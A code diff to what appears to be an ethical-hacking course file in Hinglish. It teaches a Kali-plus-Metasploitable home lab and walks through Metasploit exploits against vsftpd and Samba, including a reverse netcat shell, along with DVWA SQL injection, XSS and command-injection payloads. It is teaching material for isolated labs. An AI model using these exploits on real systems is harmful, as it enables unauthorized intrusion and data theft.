@@ -7970,33 +7970,374 @@ Online sandboxes (no setup): any.run, hybrid-analysis.com, joe sandbox
     ],
   },
   "cb-08": {
-    title: "Hacking Lab Setup",
+    title: "Hacking Lab Setup — Kali, Metasploitable & Tools",
     image: "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=900&fit=crop&auto=format",
-    tagline: "Ghar mein professional hacking lab banao — bina kuch kharab kiye practice karo!",
+    tagline: "Ghar mein professional hacking lab banao — Kali + Metasploitable + Docker — pehla real exploit run karo!",
     sections: [
       {
-        heading: "🏠 Home Lab Kyun Banana Chahiye?",
-        content: `Ethical hacking seekhne ke liye real environment chahiye — theory enough nahi.\n\n**Home lab ke fayde:**\n• Real attacks practice karo legally\n• Tools properly seekho bina risk ke\n• CTF challenges solve karo\n• Resume mein add karo — "Home Lab Experience"\n• 24/7 available — apni pace pe seekho\n\n**Budget options:**\n\n| Setup | Cost | Best For |\n|-------|------|----------|\n| Basic (VirtualBox only) | Free | Beginners |\n| Intermediate (Old PC + VMs) | 5-10k | Students |\n| Advanced (Mini PC/NUC) | 15-30k | Serious learners |\n| Pro (Dedicated server) | 50k+ | Full-time |\n\n**Software needed (sab free):**\n• VirtualBox/VMware Player\n• Kali Linux ISO\n• Ubuntu/Windows ISO (targets)\n• Metasploitable 2/3`,
+        heading: "🏠 Home Lab — Kya Chahiye aur Kyun?",
+        content: `Ethical hacking sirf theory se nahi seekhi jaati — actual practice environment chahiye. Home lab banao, legal targets pe attack karo, experience lo.
+
+**Hardware Requirements — India Budget Guide:**
+
+| Setup | RAM | Cost (approx) | Best For |
+|-------|-----|---------------|---------|
+| Minimum | 8 GB | Existing laptop | Beginner — TryHackMe + basic lab |
+| Recommended | 16 GB | 40-50k refurb ThinkPad | Student — full local lab |
+| Power User | 32 GB | 70-90k mini PC | Advanced — multiple VMs |
+| Home Server | 64+ GB | 1.5-2 lakh | Lab + cloud simulation |
+
+**Refurb Options India (2024):**
+- ThinkPad T480/X1 Carbon (i5/i7, 16GB): 25-40k — excellent Linux support
+- HP EliteBook 840 (similar range)
+- Dell Latitude 7490: 30-45k
+- All have Intel VT-x for virtualization
+
+**Free Budget Lab (cloud):**
+- Oracle Cloud Free (ARM, 24GB RAM) — permanently free
+- TryHackMe AttackBox — browser mein Kali
+- PortSwigger Web Security Academy — browser-based web labs
+- GitHub Codespaces — coding environment
+
+**Software (Sab Free):**
+\`\`\`
+VirtualBox          → hypervisor (virtualbox.org)
+Kali Linux OVA      → attacker VM (kali.org)
+Metasploitable 2    → target VM (sourceforge.net/projects/metasploitable)
+DVWA Docker         → web hacking target
+Burp Suite Community → web app testing (portswigger.net)
+Wireshark           → packet analysis
+\`\`\``,
       },
       {
-        heading: "🔧 Lab Setup Step by Step",
-        content: `**Step 1 — Kali Linux VM:**\n\`\`\`\n1. kali.org/get-kali pe jao\n2. Virtual Machine version download karo (OVA file)\n3. VirtualBox mein: File → Import Appliance → OVA select karo\n4. RAM: 2GB minimum, 4GB recommended\n5. Kali start karo: user=kali, pass=kali\n\`\`\`\n\n**Step 2 — Target Machine:**\n\`\`\`\n1. Metasploitable 2 download karo:\n   sourceforge.net/projects/metasploitable\n2. VirtualBox mein import karo\n3. Network: Host-only adapter (internet access nahi)\n4. Dono VMs ko same network pe rakho\n\`\`\`\n\n**Step 3 — Network Configuration:**\n\`\`\`\nVirtualBox → File → Host Network Manager\nCreate new: 192.168.56.0/24\n\nKali VM: Adapter 1 = NAT (internet)\n          Adapter 2 = Host-only (lab network)\n\nMetasploitable: Adapter 1 = Host-only only\n                (No internet for safety!)\n\`\`\``,
+        heading: "🔧 Step-by-Step Lab Setup — Kali + Metasploitable",
+        content: `Ek baar setup karo — lifetime practice karo. Follow karo carefully.
+
+**Step 1 — VirtualBox Install:**
+\`\`\`
+1. virtualbox.org/wiki/Downloads pe jao
+2. Windows: .exe download, double-click install
+   Ubuntu: sudo apt install virtualbox
+   macOS: .dmg download, install
+3. VirtualBox Extension Pack bhi download karo (USB 3.0, RDP support)
+   File → Preferences → Extensions → Add
+\`\`\`
+
+**Step 2 — Kali Linux VM:**
+\`\`\`
+1. kali.org/get-kali pe jao
+2. "Virtual Machines" tab → VirtualBox 64-bit download karo (OVA file ~3GB)
+3. VirtualBox mein: File → Import Appliance → OVA file select karo
+4. RAM: 2048 MB minimum set karo, 4096 recommended
+5. CPUs: 2 minimum
+6. Import complete → Kali start karo
+7. Default credentials: kali / kali
+8. Pehle karo: sudo apt update && sudo apt upgrade -y
+\`\`\`
+
+**Step 3 — Metasploitable 2 (Target VM):**
+\`\`\`
+1. sourceforge.net/projects/metasploitable search karo
+2. ZIP download karo (~800MB)
+3. Extract karo — .vmdk file milegi
+4. VirtualBox → New → Linux/Ubuntu 32-bit
+5. RAM: 512 MB
+6. Hard disk → Existing virtual disk → .vmdk select karo
+7. Settings → Network → Adapter 1 → Host-only Adapter
+8. Start karo
+9. Login: msfadmin / msfadmin
+\`\`\`
+
+**Step 4 — Network Setup (CRITICAL):**
+\`\`\`
+VirtualBox → File → Host Network Manager
+"Create" button → 192.168.56.0/24 create hoga
+DHCP Server: Enable karo
+
+Kali VM Settings → Network:
+  Adapter 1: NAT (internet access — tools download ke liye)
+  Adapter 2: Host-only Adapter (192.168.56.x — lab network)
+
+Metasploitable VM Settings → Network:
+  Adapter 1: Host-only Adapter ONLY
+  (NAT mat dena — internet pe expose hoga!)
+
+Verify:
+Kali terminal: ip addr → eth1 pe 192.168.56.xxx hona chahiye
+Metasploitable: ifconfig → 192.168.56.xxx
+\`\`\`
+
+**Step 5 — Snapshots Lena:**
+\`\`\`
+Kali VM: Machine → Take Snapshot → "Clean Kali - Fresh"
+Metasploitable VM: Machine → Take Snapshot → "Fresh Metasploitable"
+
+Ab experiments karo — kuch bhi ho, revert karo!
+\`\`\``,
       },
       {
-        heading: "🛠️ Essential Tools Install Karo",
-        content: `Kali Linux mein already bahut tools hain, kuch extra:\n\n**Burp Suite Community:**\n\`\`\`bash\n# Already in Kali!\nburpsuite  # Ya Applications → Web Application Analysis\n\`\`\`\n\n**VSCode (coding tools ke liye):**\n\`\`\`bash\nsudo apt install code  # Ya download from code.visualstudio.com\n\`\`\`\n\n**Useful Kali tools organized:**\n\`\`\`\nReconnaissance: nmap, masscan, maltego, theHarvester\nWeb: burpsuite, nikto, sqlmap, dirb, gobuster\nPasswords: hydra, john, hashcat, medusa\nExploitation: metasploit, exploitdb\nPost-exploit: bloodhound, mimikatz, powersploit\nWireless: aircrack-ng, airodump-ng, wifite\nForensics: autopsy, volatility, binwalk\n\`\`\`\n\n**Docker se extra targets:**\n\`\`\`bash\ndocker pull webgoat/goat-and-wolf\ndocker pull vulnerables/web-dvwa\ndocker pull mutillidae  # OWASP Mutillidae\n\`\`\``,
+        heading: "🛠️ Kali Linux — Tool Map",
+        content: `Kali mein 600+ tools hain — sabse important organize karke yaad karo. Applications menu mein categories ke hisaab se sorted hain.
+
+**Category-wise Important Tools:**
+
+\`\`\`
+📡 INFORMATION GATHERING (Reconnaissance):
+  nmap       → Port scanner (network ka "X-ray")
+  masscan    → Fast scanner — millions of IPs
+  theHarvester → Email, domain, employee info (OSINT)
+  maltego    → Visual link analysis (GUI)
+  recon-ng   → Modular OSINT framework
+  shodan     → Internet-facing device search
+
+🌐 WEB APPLICATION ANALYSIS:
+  burpsuite  → Web proxy, scanner, interceptor
+  nikto      → Web server vulnerability scanner
+  sqlmap     → Automatic SQL injection
+  dirb/gobuster → Directory/file brute force
+  wfuzz      → Web fuzzer
+  ffuf       → Fast fuzzer (modern gobuster alternative)
+
+🔐 PASSWORD ATTACKS:
+  hydra      → Network service brute force (SSH, FTP, HTTP)
+  john       → Password hash cracker (John the Ripper)
+  hashcat    → GPU-accelerated hash cracking
+  medusa     → Fast brute forcer
+  crunch     → Wordlist generator
+
+💥 EXPLOITATION:
+  metasploit → Exploitation framework (msfconsole)
+  searchsploit → ExploitDB local search
+  exploitdb  → Vulnerability exploit database
+  beef-xss   → Browser exploitation framework
+
+🔍 POST-EXPLOITATION:
+  mimikatz   → Windows credentials dump
+  bloodhound → Active Directory attack paths
+  empire     → PowerShell post-exploitation
+  meterpreter → Metasploit's post-exploit shell
+
+📶 WIRELESS:
+  aircrack-ng → WEP/WPA key cracking
+  airodump-ng → WiFi packet capture
+  wifite     → Automated WiFi attacks
+
+🔬 FORENSICS/REVERSE:
+  autopsy    → Digital forensics GUI
+  volatility → Memory forensics
+  binwalk    → Binary analysis, firmware extraction
+  ghidra     → NSA's reverse engineering tool (free!)
+  radare2    → Command-line reverse engineering
+\`\`\`
+
+**Quick Access in Kali:**
+\`\`\`bash
+# Applications menu → specific categories
+# Ya terminal mein directly naam type karo:
+
+msfconsole          # Metasploit Framework
+burpsuite           # Burp Suite
+wireshark           # Packet analyzer
+nmap                # Network scanner
+sqlmap -h           # SQL injection tool help
+
+# Tool updates:
+sudo apt update && sudo apt install -y kali-linux-everything
+# Warning: 20+ GB — selective install better hai:
+sudo apt install -y nmap metasploit-framework burpsuite wireshark
+\`\`\``,
       },
       {
-        heading: "📋 First Attack — Kali → Metasploitable",
-        content: `Setup verify karo — pehla attack:\n\n**Step 1: IP pata karo**\n\`\`\`bash\n# Kali mein:\nip addr show eth1  # Host-only adapter IP\n\n# Metasploitable mein:\nifconfig  # Target IP (usually 192.168.56.101)\n\`\`\`\n\n**Step 2: Nmap scan**\n\`\`\`bash\nnmap -sV -O 192.168.56.101\n# Bahut saare open ports aur services dikhenge!\n\`\`\`\n\n**Step 3: Metasploit se attack (vsftpd backdoor)**\n\`\`\`bash\nmsfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.56.101\nrun\n# Shell milegi!\nwhoami  # root!\n\`\`\`\n\n**Congratulations!** Tumne pehla real (legal) exploit run kiya!\nYeh sirf practice hai — apne own lab mein. Dusron ke systems pe kabhi nahi!`,
+        heading: "💥 Pehla Real Exploit — Kali → Metasploitable",
+        content: `Setup verify karo aur pehla real exploit run karo — completely legal (apna lab hai!).
+
+**Step 1 — Target Discover Karo:**
+\`\`\`bash
+# Kali terminal mein:
+# Host-only network scan karo
+nmap -sn 192.168.56.0/24
+# Output: Kaunse IPs live hain dikhega
+# Metasploitable ka IP note karo (e.g., 192.168.56.101)
+\`\`\`
+
+**Step 2 — Full Port + Service Scan:**
+\`\`\`bash
+nmap -sV -sC -O 192.168.56.101 -oN metasploitable_scan.txt
+# -sV: service version detect
+# -sC: default scripts run
+# -O: OS detect
+
+# Expected output (Metasploitable has many open ports):
+# PORT     STATE  SERVICE     VERSION
+# 21/tcp   open   ftp         vsftpd 2.3.4  ← BACKDOORED!
+# 22/tcp   open   ssh         OpenSSH 4.7p1
+# 23/tcp   open   telnet      Linux telnetd  ← No encryption!
+# 25/tcp   open   smtp        Postfix smtpd
+# 80/tcp   open   http        Apache 2.2.8
+# 139/tcp  open   netbios-ssn Samba smbd 3.X ← Vulnerable!
+# 3306/tcp open   mysql       MySQL 5.0.51a
+# 5900/tcp open   vnc         VNC protocol 3.3 ← Default no password!
+\`\`\`
+
+**Step 3 — vsftpd Backdoor Exploit (Classic!):**
+\`\`\`bash
+# vsftpd 2.3.4 mein intentional backdoor tha (malicious code injection 2011 mein)
+# :) smiley as username trigger karta tha backdoor
+# Metasploitable pe vulnerable version deliberately installed hai
+
+msfconsole
+# MSF prompt: msf6 >
+
+msf6 > search vsftpd
+# Exploit milega: exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > show options
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
+msf6 exploit(vsftpd_234_backdoor) > run
+
+# Expected output:
+# [*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
+# [*] 192.168.56.101:21 - USER: 331 Please specify the password.
+# [+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
+# [+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
+# [*] Found shell.
+# [*] Command shell session 1 opened
+
+# Ab root shell mein ho:
+id              # uid=0(root) gid=0(root)
+cat /etc/passwd # All users
+ls /home        # User directories
+uname -a        # OS info
+\`\`\`
+
+**Step 4 — Samba Exploit (CVE-2007-2447):**
+\`\`\`bash
+msf6 > search samba usermap
+# exploit/multi/samba/usermap_script
+
+msf6 > use exploit/multi/samba/usermap_script
+msf6 > set RHOSTS 192.168.56.101
+msf6 > set PAYLOAD cmd/unix/reverse_netcat
+msf6 > set LHOST 192.168.56.100  # Kali ka IP
+msf6 > run
+# Another root shell!
+\`\`\`
+
+**Step 5 — Web Hacking — DVWA:**
+\`\`\`bash
+# Metasploitable pe port 80 pe DVWA installed hai:
+# Kali browser → http://192.168.56.101/dvwa
+# Login: admin / password
+# Setup → Create/Reset Database
+# DVWA Security → Low
+
+# Ab practice karo:
+# SQL Injection tab → '1' OR '1'='1'# → All users visible!
+# XSS tab → <script>alert('XSS')</script>
+# Command Injection → ;cat /etc/passwd
+\`\`\`
+
+**⚠️ Ethics Reminder:**
+\`\`\`
+LEGAL: Apne lab mein (VirtualBox VMs)
+LEGAL: TryHackMe, HackTheBox, VulnHub
+LEGAL: Bug bounty programs (authorized scope)
+LEGAL: CTF competitions
+
+ILLEGAL: Kisi bhi real website/system pe bina permission
+ILLEGAL: "Just to test" — intent matter nahi karta
+ILLEGAL: Friends ka system "permission se" bina writing ke
+
+Rule: Agar likha nahi hai — permission nahi hai.
+\`\`\``,
+      },
+      {
+        heading: "☁️ Cloud Labs — No Hardware Needed",
+        content: `Hardware nahi hai ya setup ka time nahi? Cloud labs se instantly shuru karo.
+
+**TryHackMe — Best for Beginners:**
+\`\`\`
+URL: tryhackme.com
+Free tier: Plenty of rooms
+AttackBox: Browser mein full Kali Linux — koi VPN, koi setup nahi
+
+Suggested Learning Path (order mein):
+1. "Pre-Security" path (beginner theory)
+2. "Linux Fundamentals" (1, 2, 3)
+3. "Introduction to Cybersecurity"
+4. "Jr Penetration Tester" path
+5. "OWASP Top 10 - 2021" room
+
+Cost: Free start → $14/month premium (agar more rooms chahiye)
+\`\`\`
+
+**PortSwigger Web Security Academy:**
+\`\`\`
+URL: portswigger.net/web-security
+Cost: Completely FREE — certificate bhi free!
+Content: 200+ web security labs, no setup needed
+
+Coverage:
+✓ SQL Injection (all types — error, blind, UNION)
+✓ XSS (reflected, stored, DOM)
+✓ CSRF, SSRF, XXE
+✓ Authentication bypasses
+✓ Business logic flaws
+✓ HTTP request smuggling
+✓ Advanced topics (OAuth, JWT, WebSockets)
+
+Certificate: Finish all labs → free certificate (recognized in industry)
+\`\`\`
+
+**Oracle Cloud Always Free (Best Value):**
+\`\`\`
+URL: cloud.oracle.com/free
+Cost: Rs 0 forever (not a trial!)
+
+What you get:
+- 2-4 ARM VMs (total 4 CPUs + 24 GB RAM)
+- 200 GB storage
+- 10 TB outbound bandwidth/month
+- Virtual Cloud Network
+
+Lab setup on Oracle Cloud:
+1. Ubuntu 22.04 ARM VM → Kali tools install
+2. Second VM → Metasploitable ya DVWA Docker
+3. Private VCN se dono connect karo
+4. Public IP se Kali SSH access
+
+Kali on ARM:
+sudo apt install -y nmap metasploit-framework burpsuite gobuster sqlmap
+# Most tools ARM pe kaam karte hain
+\`\`\`
+
+**HackTheBox — Intermediate+:**
+\`\`\`
+URL: hackthebox.com
+Free: Retired machines (writeups available)
+VIP: $14/month — active machines + Prolab
+
+Approach:
+1. VPN download karo → Kali pe connect
+2. Starting Point: guided machines (beginner)
+3. Easy Machines → Medium → Hard
+4. Community Discord + forums — hints ke liye
+5. OSCP ke liye ideal prep
+
+India mein jobs: HTB profile + OSCP = strong combination
+\`\`\``,
       },
     ],
     keyPoints: [
-      "Home lab = legal practice environment — free VirtualBox se banao",
-      "Kali (attacker) + Metasploitable (target) = basic lab",
-      "Network: Host-only adapter use karo — internet se isolated",
-      "Snapshot lena = experiments ke baad wapas jao",
-      "DVWA, WebGoat — web hacking practice ke liye best",
+      "Home lab minimum: 8GB RAM PC + VirtualBox (free) + Kali OVA + Metasploitable 2",
+      "Network: Metasploitable = Host-only ONLY; Kali = NAT + Host-only (internet + lab access both)",
+      "Kali tools: nmap (scan), msfconsole (exploit), burpsuite (web), hashcat (crack), hydra (bruteforce)",
+      "vsftpd 2.3.4 backdoor: Metasploitable pe pehla exploit — MSF exploit/unix/ftp/vsftpd_234_backdoor se root shell!",
+      "Cloud labs: TryHackMe AttackBox (browser Kali), PortSwigger Academy (free web labs), Oracle Cloud (free VMs)",
+      "DVWA (http://IP/dvwa): SQL injection, XSS, command injection safe practice target",
+      "Ethics: Sirf authorized targets pe (own lab, TryHackMe, bug bounty scope) — bina permission ke kabhi nahi",
+      "Progression: Metasploitable → VulnHub → TryHackMe → HackTheBox → Bug Bounty",
     ],
     labs: [
       {
